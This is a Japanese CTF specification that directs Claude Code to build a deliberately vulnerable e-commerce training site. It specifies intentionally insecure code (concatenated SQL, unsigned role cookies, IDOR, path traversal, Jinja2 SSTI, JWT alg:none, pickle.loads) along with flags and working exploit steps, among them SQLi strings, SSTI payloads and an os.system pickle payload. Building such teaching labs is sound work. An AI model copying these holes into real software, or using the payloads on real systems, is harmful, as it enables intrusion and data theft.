# challenges.md — CTF問題仕様書（Claude Code実装用）

このファイルは `CLAUDE.md` の補足資料であり、EC サイトテーマのCTFに含まれる全10問の**問題文・画面表示内容・実装方法・フラグ**を定義する。Claude Code は本ファイルの内容に従って各チャレンジを実装すること。

## 共通ルール

- フラグ形式：`FLAG{snake_case_message}`
- フラグ文字列はソースコードに直書きせず、**環境変数**または**DBのseedデータ**として持たせる（`CLAUDE.md` の「配布方式とフラグ保護方針」参照）
- 受講生はソースコードを閲覧・改変しない。ブラウザ（開発者ツール含む）とターミナル（curl / Python等）のみで完結させる
- 各問題は独立した機能として実装し、他の問題の実装に依存しないこと

---

## 問1：ようこそCTFへ

- **難易度：** ★☆☆☆☆
- **脆弱性：** 機密情報の平文埋め込み（HTMLコメント）
- **EC機能：** トップページのキャンペーンバナー
- **フラグ環境変数名：** `FLAG_01`
- **フラグ値：** `FLAG{welcome_to_the_ctf_world}`

**問題文（画面に表示する説明文）：**
```
🎉 Web CTF チャレンジへようこそ！

これから全10問、初級から上級まで様々なWebアプリケーションの
脆弱性に挑戦してもらいます。

このページ自体にも、実は「あるもの」が隠れています。
ブラウザの機能を使って探してみましょう。

ヒント：右クリック → 「ページのソースを表示」
```

**実装方法：**
- トップページ（`/`）のHTMLの `<head>` 内に以下のコメントを埋め込む
  ```html
  <!-- FLAG{welcome_to_the_ctf_world} -->
  ```
- 通常のECトップページ（おすすめ商品・キャンペーンバナーなど）として違和感のない見た目にする

**攻略手順：** ブラウザで対象ページを開き、右クリック→「ページのソースを表示」（`Ctrl+U`）でコメントを確認する。

---

## 問2：デベロッパーの置き土産

- **難易度：** ★☆☆☆☆
- **脆弱性：** 機密情報の平文埋め込み（JSファイル内コメント）
- **EC機能：** 商品一覧ページの読み込みJS
- **フラグ環境変数名：** `FLAG_02`
- **フラグ値：** `FLAG{dont_forget_to_clean_up_your_code}`

**問題文：**
```
🛒 商品一覧ページを見てみよう

このページはリリース直前まで機能追加が続いていたようです。
エンジニアがデバッグ用のコードを消し忘れているかもしれません。

開発者ツール（F12）を開いて、
読み込まれているJavaScriptファイルを確認してみましょう。
```

**実装方法：**
- 商品一覧ページ（`/products`）で読み込む `static/js/products.js` 内にコメントとしてフラグを残す
  ```javascript
  // TODO: remove before deploy
  // FLAG{dont_forget_to_clean_up_your_code}
  console.log("debug mode: on");
  ```

**攻略手順：** 開発者ツール（F12）→ Sources または Network タブから読み込まれたJSファイルを開き、コメントを確認する。

---

## 問3：ロボットさんのひみつ

- **難易度：** ★☆☆☆☆
- **脆弱性：** Security through obscurity（隠しページへの認可なしアクセス）
- **EC機能：** 在庫管理システムへの隠しリンク
- **フラグ環境変数名：** `FLAG_03`
- **フラグ値：** `FLAG{robots_txt_is_not_a_security_measure}`

**問題文：**
```
このサイトを歩き回っていると、
「クローラーには見られたくないページ」が
どこかに設定されているという噂を聞いた。

そういうページの場所は、大抵決まったファイルに
書かれているらしい…？
```

**実装方法：**
- `/robots.txt` に以下を記載
  ```
  User-agent: *
  Disallow: /warehouse-admin-9x7f2
  ```
- `/warehouse-admin-9x7f2` にアクセスすると、認証なしで以下の画面を表示
  ```
  🤖 在庫管理システム（テスト環境）

  ここまでたどり着いたか！

  Disallowは「見せたくない」というお願いであって、
  鍵ではありません。

  FLAG{robots_txt_is_not_a_security_measure}
  ```

**攻略手順：** `https://target/robots.txt` にアクセスして隠しパスを発見し、そのパスに直接アクセスする。

---

## 問4：あなたは誰？

- **難易度：** ★★☆☆☆
- **脆弱性：** クライアント側での認可判定（非署名Cookie）
- **EC機能：** マイページ → 店舗管理画面
- **フラグ環境変数名：** `FLAG_04`
- **フラグ値：** `FLAG{cookies_should_never_be_trusted_blindly}`

**問題文：**
```
ようこそ、ゲストさん

現在の権限：一般ユーザー

🔒 店舗管理画面
このページを見るには店舗オーナー権限が必要です。
```

`/store-admin` に一般ユーザーのままアクセスした場合：
```
⛔ アクセス拒否
このページは店舗オーナー専用です。
```

`/store-admin` に `role=admin` へ改ざん後アクセスした場合：
```
👑 店舗管理画面へようこそ

売上・在庫・会員情報を管理できます。

あなたは今、店舗オーナーとして認識されています。
Cookieの中身を信用しすぎるとこうなります。

FLAG{cookies_should_never_be_trusted_blindly}
```

**実装方法：**
- ログイン成功時、Flask標準の署名付き `session` は使わず、`resp.set_cookie('role', 'user')` のように非署名の生Cookieとして権限情報を持たせる
- `/store-admin` ルートでは、Cookieの `role` 値が `admin` かどうかだけで認可判定する（サーバー側でユーザーの実際の権限をDB照合しない）

**攻略手順：**
- 開発者ツール → Application/Storage タブでCookieを確認し、`role=user` を発見
- Cookieの値を `role=admin` に書き換えて `/store-admin` にアクセス
  - ブラウザの開発者ツールから直接編集、または
  - `curl -b "role=admin" https://target/store-admin`

---

## 問5：合言葉はいらない

- **難易度：** ★★☆☆☆
- **脆弱性：** SQLインジェクション（認証バイパス）
- **EC機能：** ログインフォーム
- **フラグ環境変数名：** `FLAG_05`（※DBのseedデータとして持たせることを推奨。詳細は実装方法参照）
- **フラグ値：** `FLAG{sql_injection_1s_still_alive_in_2026}`

**問題文：**
```
🔐 会員専用ページ

ユーザー名：[________]
パスワード：[________]
          [ ログイン ]

※パスワードを忘れた方は管理者にお問い合わせください
```

ログイン成功時（SQLi成立時）：
```
✅ ログイン成功

ようこそ、admin さん

システムは今、あなたを「なりすまし」だと
気づいていないようです。

FLAG{sql_injection_1s_still_alive_in_2026}
```

ログイン失敗時：
```
❌ ユーザー名またはパスワードが間違っています
```

**実装方法：**
- ログインクエリを文字列結合で組み立てる（パラメータバインディングを使わない）
  ```python
  query = f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
  ```
- `users` テーブルの `admin` ユーザーの `bio` や専用カラムにフラグ文字列をDBのseedデータとして格納し、ログイン成功後のマイページ等に表示する（ソースコード上にフラグ文字列を書かない）

**攻略手順：** ユーザー名欄に `' OR '1'='1' -- ` を入力してログイン（パスワードは任意）。curlでも可：
```bash
curl -d "username=' OR '1'='1' -- &password=x" https://target/login
```

---

## 問6：隣の部屋がのぞける

- **難易度：** ★★☆☆☆
- **脆弱性：** IDOR（所有者チェック漏れ）
- **EC機能：** 注文履歴詳細ページ
- **フラグ環境変数名：** なし（DBのseedデータとして格納）
- **フラグ値：** `FLAG{idor_lets_you_peek_into_others_rooms}`

**問題文：**
```
👤 注文履歴

注文番号：1042
商品：ワイヤレスイヤホン
配送状況：発送済み
```

`/orders/1`（本来アクセス不可な他人の注文、かつ管理者アカウントの注文）にアクセスした場合：
```
📦 注文詳細

注文番号：1
顧客名：System Administrator
配送先住所・備考欄：
このページは本来、他人からは見えないはずでした。

URLの数字を変えるだけで、
簡単に他人の部屋を覗けてしまいましたね。

FLAG{idor_lets_you_peek_into_others_rooms}
```

**実装方法：**
- `/orders/<int:order_id>` で、ログイン中のユーザーIDと注文の `user_id` を照合する処理を実装しない
- `orders` テーブルに管理者アカウントの注文レコードを1件用意し、その `note` カラム等にフラグをseedデータとして格納する

**攻略手順：** ログイン状態で自分の注文詳細URL（例：`/orders/42`）の数字を `1` に変更してアクセスする。

---

## 問7：どこまでも遡れる

- **難易度：** ★★★☆☆
- **脆弱性：** パストラバーサル
- **EC機能：** 領収書PDFダウンロード
- **フラグファイル：** アプリ専用の隔離ディレクトリに配置（例：`/app/secret/flag07.txt`）
- **フラグ値：** `FLAG{path_traversal_climbs_out_of_the_sandbox}`

**問題文：**
```
📁 領収書ダウンロード

過去の注文の領収書をダウンロードできます。

ファイル名を指定してダウンロード：
[________________] [ ダウンロード ]

例：receipt_1042.pdf
```

`filename=../../secret/flag07.txt` 等で取得したファイルの中身：
```
おめでとうございます！

このフォルダの外にあるファイルを
読み取ることに成功しました。

FLAG{path_traversal_climbs_out_of_the_sandbox}
```

**実装方法：**
```python
send_file(os.path.join(RECEIPT_DIR, filename))
```
のように `filename` をサニタイズせず結合する。読み取らせる対象は **アプリ専用の隔離ディレクトリ**（`secret/flag07.txt`）に限定し、OSの実ファイル（`/etc/passwd` 等）には到達できない構成にする（コンテナ内のディレクトリ構造で意図的に配置）。

**攻略手順：**
```
https://target/download?filename=../../secret/flag07.txt
```
またはcurl：
```bash
curl "https://target/download?filename=../../secret/flag07.txt"
```

---

## 問8：テンプレートに話しかける

- **難易度：** ★★★☆☆
- **脆弱性：** SSTI（Jinja2テンプレートインジェクション）
- **EC機能：** 商品レビュー投稿時の「お名前」表示
- **フラグ格納場所：** 環境変数または `app.config` に格納（コード直書き禁止）
- **フラグ値：** `FLAG{ssti_turns_templates_into_code}`

**問題文：**
```
✍️ レビューを投稿する

お名前：[________________]
評価：★★★★★
コメント：[________________]
       [ 投稿する ]
```

通常入力（例：「田中」）の結果：
```
田中さんのレビューを投稿しました。
ご協力ありがとうございます！
```

`{{7*7}}` を入力した結果：
```
49さんのレビューを投稿しました。
ご協力ありがとうございます！
```
（この時点でSSTIに気づかせる）

`{{ config }}` や subclasses 経由で最終的にフラグを取得できる経路を用意する。

**実装方法：**
```python
message = render_template_string(f"{name}さんのレビューを投稿しました。")
```
のように、ユーザー入力をテンプレート文字列に直接埋め込んで `render_template_string` に渡す。フラグは `app.config['FLAG_08']`（環境変数から読み込み）に格納し、`{{ config }}` 経由、または `__class__.__mro__` を辿るペイロードで最終的に到達・読み取り可能にする。

**攻略手順：**
1. お名前欄に `{{7*7}}` と入力し、`49` が返ることを確認
2. `{{ config }}` でFlaskの設定情報を確認し、`FLAG_08` を発見する、またはより発展的なペイロード（`{{ self.__init__.__globals__...}}` 等）でファイル/環境変数を読み取る

---

## 問9：署名なんて飾りです

- **難易度：** ★★★★☆
- **脆弱性：** JWTの `alg: none` 受け入れ
- **EC機能：** 会員API（購入履歴取得・管理画面アクセス）
- **フラグ環境変数名：** `FLAG_09`
- **フラグ値：** `FLAG{alg_none_means_no_signature_needed}`

**問題文：**
```
🔑 あなたのアカウント情報

現在のロール：user

（Cookie / LocalStorage にJWTトークンが保存されている）
```

`/api/admin-dashboard` に `alg:none` トークンでアクセス成功時：
```
🎛️ 管理者ダッシュボード

トークンの署名を検証せずに
中身だけを信じてしまうと、こうなります。

FLAG{alg_none_means_no_signature_needed}
```

失敗時（署名検証に引っかかった場合）：
```
⛔ トークンが無効です
```

**実装方法：**
- JWTの検証処理で、ヘッダーの `alg` を確認せずペイロードをそのまま信用する、または `alg: none` を明示的に許可する分岐を残す
- ログイン時に発行するトークンのペイロードに `role: "user"` を含める
- `/api/admin-dashboard` は、トークンの `role` が `admin` であれば署名の正当性を問わずアクセスを許可する

**攻略手順：**
1. ログイン後、Cookie/LocalStorageからJWT文字列を取得
2. Base64パートをデコードし、ペイロードの `role` を `admin` に変更
3. ヘッダーを `{"alg":"none","typ":"JWT"}` に変更
4. 署名部分を空にした新トークン（`header.payload.`）を作成（Python等で実施）
5. 改ざんしたトークンでアクセス：
   ```bash
   curl -H "Authorization: Bearer <改ざんトークン>" https://target/api/admin-dashboard
   ```

---

## 問10：復元されたオブジェクトの罠

- **難易度：** ★★★★★
- **脆弱性：** 安全でないデシリアライゼーション（`pickle.loads`）
- **EC機能：** カート/お気に入りのバックアップ保存・復元機能
- **フラグファイル：** コンテナ内の隔離パス（例：`/app/secret/flag10.txt`）
- **フラグ値：** `FLAG{pickle_deserialization_gives_you_rce}`

**問題文：**
```
⚙️ カートのバックアップ

現在のカート内容をバックアップとして保存し、
後で復元することができます。

[ バックアップを保存する ]

復元用データ：
[________________________] [ 復元する ]

※上級者向け：保存データの形式は
  Base64エンコードされたバイナリです
```

悪意あるpickleペイロードを「復元する」に投入し、RCEに成功した場合の表示：
```
⚠️ 復元処理でエラーが発生しました

...しかしその過程で、サーバー上のファイルが
実行・読み取りされてしまったようです。

FLAG{pickle_deserialization_gives_you_rce}
```

**実装方法：**
```python
data = pickle.loads(base64.b64decode(request.form.get('backup_data')))
```
のように、ユーザーが送信したBase64文字列をそのままデシリアライズする。実行結果（`flag10.txt` の中身）をアプリ側でキャプチャしてHTTPレスポンスに含める設計にし、受講生がシェルを取らなくてもフラグを取得できるようにする。

**⚠️ 実装・運用上の必須事項：** 本問はコンテナ内で任意コード実行が成立する設計のため、`CLAUDE.md` の「配布方式とフラグ保護方針」「安全上の注意」に従い、必ず隔離された環境でのみ動作させること。

**攻略手順（受講生側）：**
1. ターミナルでペイロードを生成
   ```python
   import pickle, base64, os
   class Exploit:
       def __reduce__(self):
           return (os.system, ('cat /app/secret/flag10.txt > /tmp/output',))
   payload = base64.b64encode(pickle.dumps(Exploit()))
   print(payload.decode())
   ```
2. 生成したBase64文字列を「復元する」フォームに貼り付けて送信
3. サーバー側でデシリアライズされた瞬間にコマンドが実行され、フラグがレスポンスに含まれて返る

---

## 実装チェックリスト（Claude Code向け）

- [ ] 全10問が独立したルート/機能として実装されている
- [ ] フラグ文字列がソースコードに直書きされていない（環境変数 or DB seed経由）
- [ ] 問7・問10で読み取らせる対象がアプリ専用の隔離ディレクトリに限定されている
- [ ] 問4のCookieがFlask標準の署名付きsessionではなく、非署名の生Cookieになっている
- [ ] 問5のSQLクエリが文字列結合で組まれている（意図的な脆弱実装）
- [ ] 問9のJWT検証処理に `alg` 未検証の分岐がある
- [ ] `docker compose up` 一発で全問が再現可能な状態になる
